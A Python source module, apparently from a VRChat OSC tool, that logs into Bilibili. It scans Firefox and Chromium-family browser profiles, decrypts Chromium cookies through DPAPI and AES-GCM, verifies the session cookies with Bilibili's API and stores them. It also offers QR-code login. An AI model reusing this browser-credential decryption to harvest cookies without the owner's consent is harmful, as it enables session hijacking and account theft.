import base64
import glob
import json
import logging
import os
import shutil
import sqlite3
import sys
import tempfile
from typing import Dict, List, Optional

import browser_cookie3
import requests
from bilibili_api import login_v2
from database import AuthProfile, Session
from sqlmodel import select

# Global instance for QR code login
qr_login_instance: Optional[login_v2.QrCodeLogin] = None

try:
    from Cryptodome.Cipher import AES
except ImportError:
    try:
        from Crypto.Cipher import AES
    except ImportError:
        AES = None

try:
    import win32crypt
except ImportError:
    win32crypt = None

logger = logging.getLogger(__name__)

def get_firefox_cookies() -> List[Dict]:
    cookies_found = []
    appdata = os.environ.get('APPDATA')
    if not appdata:
        return cookies_found
        
    firefox_profiles = os.path.join(appdata, 'Mozilla', 'Firefox', 'Profiles')
    if not os.path.exists(firefox_profiles):
        return cookies_found
        
    for db_path in glob.glob(os.path.join(firefox_profiles, '*', 'cookies.sqlite')):
        temp_db = os.path.join(tempfile.gettempdir(), 'vrcosc_firefox_cookies.sqlite')
        try:
            shutil.copy2(db_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute(
                "SELECT name, value FROM moz_cookies WHERE host LIKE '%bilibili.com%'"
            )
            cookies = {}
            for name, value in cursor.fetchall():
                cookies[name] = value
            conn.close()
            
            bili_jct = cookies.get("bili_jct", "")
            dedeuserid = cookies.get("DedeUserID", "")
            sessdata = cookies.get("SESSDATA", "")
            buvid3 = cookies.get("buvid3", "")
            
            if bili_jct and dedeuserid and sessdata:
                cookies_found.append({
                    "bili_jct": bili_jct,
                    "dedeuserid": dedeuserid,
                    "sessdata": sessdata,
                    "buvid3": buvid3
                })
        except Exception as e:
            logger.debug(f"Failed to read Firefox cookies from {db_path}: {e}")
        finally:
            if os.path.exists(temp_db):
                try:
                    os.remove(temp_db)
                except Exception:
                    pass
    return cookies_found

def get_chromium_cookies(browser_name: str, local_state_path: str, cookies_dir: str) -> List[Dict]:
    cookies_found = []
    if not os.path.exists(local_state_path) or win32crypt is None or AES is None:
        return cookies_found

    # 1. Get encryption key
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.loads(f.read())
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        if encrypted_key.startswith(b'DPAPI'):
            encrypted_key = encrypted_key[5:]
        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        logger.debug(f"Failed to decrypt key for {browser_name}: {e}")
        return cookies_found

    # 2. Find Cookies databases
    cookie_paths = glob.glob(os.path.join(cookies_dir, "Default", "Network", "Cookies")) + \
                   glob.glob(os.path.join(cookies_dir, "Profile *", "Network", "Cookies")) + \
                   glob.glob(os.path.join(cookies_dir, "Default", "Cookies")) + \
                   glob.glob(os.path.join(cookies_dir, "Profile *", "Cookies"))

    for db_path in cookie_paths:
        if not os.path.exists(db_path):
            continue
        temp_db = os.path.join(tempfile.gettempdir(), f'vrcosc_{browser_name}_cookies.sqlite')
        try:
            shutil.copy2(db_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute(
                "SELECT name, encrypted_value FROM cookies WHERE host_key LIKE '%bilibili.com%'"
            )
            cookies = {}
            for name, encrypted_value in cursor.fetchall():
                decrypted = ""
                try:
                    if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
                        iv = encrypted_value[3:15]
                        payload = encrypted_value[15:]
                        cipher = AES.new(key, AES.MODE_GCM, iv)
                        decrypted = cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
                    elif encrypted_value.startswith(b'v20'):
                        logger.debug(f"Skipping v20 App-Bound cookie: {name} in {browser_name}")
                        continue
                    else:
                        decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8', errors='ignore')
                except Exception as ex:
                    logger.debug(f"Failed to decrypt cookie {name} in {browser_name}: {ex}")
                    continue
                if decrypted:
                    cookies[name] = decrypted
            conn.close()

            bili_jct = cookies.get("bili_jct", "")
            dedeuserid = cookies.get("DedeUserID", "")
            sessdata = cookies.get("SESSDATA", "")
            buvid3 = cookies.get("buvid3", "")

            if bili_jct and dedeuserid and sessdata:
                cookies_found.append({
                    "bili_jct": bili_jct,
                    "dedeuserid": dedeuserid,
                    "sessdata": sessdata,
                    "buvid3": buvid3
                })
        except Exception as e:
            logger.debug(f"Failed to read cookies from {db_path} for {browser_name}: {e}")
        finally:
            if os.path.exists(temp_db):
                try:
                    os.remove(temp_db)
                except Exception:
                    pass
    return cookies_found

def get_bilibili_cookies_from_browser() -> List[Dict]:
    """Scans browsers for Bilibili cookies and returns a list of active sessions."""
    profiles = []
    
    # 1. Try highly robust custom Windows extractor
    if sys.platform == "win32":
        try:
            raw_cookies = []
            logger.info("Auto-scanning browsers for active Bilibili login cookies...")
            
            logger.info("Scanning Firefox profiles...")
            firefox_cookies = get_firefox_cookies()
            if firefox_cookies:
                logger.info(f"[Firefox] Found {len(firefox_cookies)} potential Bilibili cookie session(s).")
                raw_cookies.extend(firefox_cookies)
            else:
                logger.info("[Firefox] No Bilibili cookies found.")
            
            local_appdata = os.environ.get('LOCALAPPDATA', '')
            appdata = os.environ.get('APPDATA', '')
            
            chromium_browsers = [
                {
                    "name": "Chrome",
                    "local_state": os.path.join(local_appdata, "Google", "Chrome", "User Data", "Local State"),
                    "cookies_dir": os.path.join(local_appdata, "Google", "Chrome", "User Data")
                },
                {
                    "name": "Edge",
                    "local_state": os.path.join(local_appdata, "Microsoft", "Edge", "User Data", "Local State"),
                    "cookies_dir": os.path.join(local_appdata, "Microsoft", "Edge", "User Data")
                },
                {
                    "name": "Brave",
                    "local_state": os.path.join(local_appdata, "BraveSoftware", "Brave-Browser", "User Data", "Local State"),
                    "cookies_dir": os.path.join(local_appdata, "BraveSoftware", "Brave-Browser", "User Data")
                },
                {
                    "name": "Opera",
                    "local_state": os.path.join(appdata, "Opera Software", "Opera Stable", "Local State"),
                    "cookies_dir": os.path.join(appdata, "Opera Software", "Opera Stable")
                },
                {
                    "name": "Vivaldi",
                    "local_state": os.path.join(local_appdata, "Vivaldi", "User Data", "Local State"),
                    "cookies_dir": os.path.join(local_appdata, "Vivaldi", "User Data")
                }
            ]
            
            for browser in chromium_browsers:
                try:
                    logger.info(f"Scanning {browser['name']} profiles...")
                    browser_cookies = get_chromium_cookies(browser["name"], browser["local_state"], browser["cookies_dir"])
                    if browser_cookies:
                        logger.info(f"[{browser['name']}] Found {len(browser_cookies)} potential Bilibili cookie session(s).")
                        raw_cookies.extend(browser_cookies)
                    else:
                        logger.info(f"[{browser['name']}] No Bilibili cookies found.")
                except Exception as ex:
                    logger.debug(f"Failed to scan chromium browser {browser['name']}: {ex}")
            
            if raw_cookies:
                logger.info(f"Found {len(raw_cookies)} total raw Bilibili cookie sessions. Verifying with Bilibili API...")
            
            for item in raw_cookies:
                try:
                    profile = verify_and_fetch_profile(
                        item["bili_jct"], item["dedeuserid"], item["sessdata"], item["buvid3"]
                    )
                    if profile and profile not in profiles:
                        logger.info(f"[API] Verified active Bilibili login for user: {profile['name']} (UID: {profile['uid']})")
                        profiles.append(profile)
                except Exception as ex:
                    logger.debug(f"Failed to verify profile for extracted cookie: {ex}")
        except Exception as e:
            logger.error(f"Error in custom Windows cookie extraction: {e}")
            
    # 2. Fallback to browser_cookie3 if profiles is empty (or on non-Windows platforms)
    if not profiles:
        logger.info("Falling back to browser_cookie3 for cookie extraction...")
        browsers = [
            browser_cookie3.chrome,
            browser_cookie3.firefox,
            browser_cookie3.edge,
            browser_cookie3.opera,
            browser_cookie3.chromium,
            browser_cookie3.brave,
            browser_cookie3.vivaldi,
            browser_cookie3.safari,
        ]

        for get_cookies in browsers:
            try:
                cj = get_cookies(domain_name=".bilibili.com")
                bili_jct = ""
                dedeuserid = ""
                sessdata = ""
                buvid3 = ""
                for cookie in cj:
                    if cookie.name == "bili_jct":
                        bili_jct = cookie.value
                    elif cookie.name == "DedeUserID":
                        dedeuserid = cookie.value
                    elif cookie.name == "SESSDATA":
                        sessdata = cookie.value
                    elif cookie.name == "buvid3":
                        buvid3 = cookie.value

                if dedeuserid and sessdata and bili_jct:
                    profile = verify_and_fetch_profile(
                        bili_jct, dedeuserid, sessdata, buvid3
                    )
                    if profile and profile not in profiles:
                        profiles.append(profile)
            except Exception:
                continue
                
    return profiles


def verify_and_fetch_profile(
    bili_jct: str, dedeuserid: str, sessdata: str, buvid3: str
) -> Optional[Dict]:
    cookies = {
        "bili_jct": bili_jct,
        "DedeUserID": dedeuserid,
        "SESSDATA": sessdata,
        "buvid3": buvid3,
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Referer": "https://www.bilibili.com/",
    }
    try:
        r = requests.get(
            "https://api.bilibili.com/x/space/myinfo", cookies=cookies, headers=headers, timeout=5
        )
        if r.status_code == 200:
            data = r.json()
            if data["code"] == 0:
                return {
                    "uid": int(dedeuserid),
                    "name": data["data"]["name"],
                    "face_url": data["data"]["face"],
                    "bili_jct": bili_jct,
                    "dedeuserid": dedeuserid,
                    "sessdata": sessdata,
                    "buvid3": buvid3,
                }
    except Exception:
        pass
    return None


def save_auth_profile(session: Session, profile_data: Dict, set_active: bool = True):
    existing = session.exec(
        select(AuthProfile).where(AuthProfile.uid == profile_data["uid"])
    ).first()
    if not existing:
        existing = AuthProfile(**profile_data)
        session.add(existing)
    else:
        for k, v in profile_data.items():
            setattr(existing, k, v)

    if set_active:
        # deactivate others
        others = session.exec(select(AuthProfile)).all()
        for o in others:
            o.is_active = False
        existing.is_active = True

    session.commit()
    session.refresh(existing)
    return existing


def get_active_auth_profile(session: Session) -> Optional[AuthProfile]:
    return session.exec(
        select(AuthProfile).where(AuthProfile.is_active == True)
    ).first()

async def generate_qr_code() -> str:
    global qr_login_instance
    qr_login_instance = login_v2.QrCodeLogin()
    await qr_login_instance.generate_qrcode()
    # Need to bypass private attribute to get the actual URL
    # pylint: disable=protected-access
    return getattr(qr_login_instance, "_QrCodeLogin__qr_link", "")

async def check_qr_code(session: Session) -> Optional[Dict]:
    global qr_login_instance
    if not qr_login_instance:
        return {"status": "none"}
        
    info = await qr_login_instance.check_state()
    # It returns an enum (QrCodeLoginEvents)
    if qr_login_instance.has_done():
        cred = qr_login_instance.get_credential()
        if cred:
            profile = verify_and_fetch_profile(
                cred.bili_jct, cred.dedeuserid, cred.sessdata, cred.buvid3
            )
            if profile:
                saved = save_auth_profile(session, profile, set_active=True)
                return {"status": "done", "profile": saved.model_dump()}
        return {"status": "error"}
    return {"status": info.name}
